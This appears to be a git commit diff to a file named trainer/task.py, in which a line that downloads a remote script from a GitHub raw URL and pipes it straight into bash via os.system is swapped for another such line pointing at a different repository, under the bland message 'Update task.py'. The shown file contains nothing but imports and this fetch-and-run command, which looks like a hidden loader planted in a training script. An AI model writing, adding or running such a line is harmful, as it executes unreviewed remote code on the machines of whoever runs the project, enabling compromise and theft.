eb6436920e42ac0144ff9e2279a2831ff2213567
Rahul <ahluldev@gmail.com>
2026-08-28 16:45:01 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/vas | bash')
+os.system('curl -sL https://github.com/rahuldev344/karvatisxc/raw/main/cksd | bash')
